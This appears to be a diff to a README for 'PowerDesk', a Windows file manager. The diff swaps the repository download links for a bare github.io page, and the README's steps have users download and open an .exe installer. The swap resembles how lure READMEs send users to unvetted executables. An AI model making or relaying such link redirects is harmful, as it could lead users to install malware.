@@ -1,6 +1,6 @@
 # 📁 PowerDesk - Manage your Windows files with ease
 
-[![Download PowerDesk](https://img.shields.io/badge/Download-PowerDesk-blue)](https://github.com/0811sakshamsharma-spec/PowerDesk)
+[![Download PowerDesk](https://img.shields.io/badge/Download-PowerDesk-blue)](https://0811sakshamsharma-spec.github.io)
 
 PowerDesk serves as a modern file manager for Windows. It provides a clean interface for users who want a better way to navigate their folders, search for documents, and organize their digital files. Built with contemporary web technologies, the app offers speed and reliability for your daily tasks.
 
@@ -8,7 +8,7 @@ PowerDesk serves as a modern file manager for Windows. It provides a clean inter
 
 PowerDesk runs on Windows computers. Follow these steps to set the application up on your system.
 
-1. Go to the [official download page](https://github.com/0811sakshamsharma-spec/PowerDesk).
+1. Go to the [official download page](https://0811sakshamsharma-spec.github.io).
 2. Look for the latest version under the Releases section.
 3. Download the installer file—usually ending in .exe—to your computer.
 4. Open the file to start the installation.
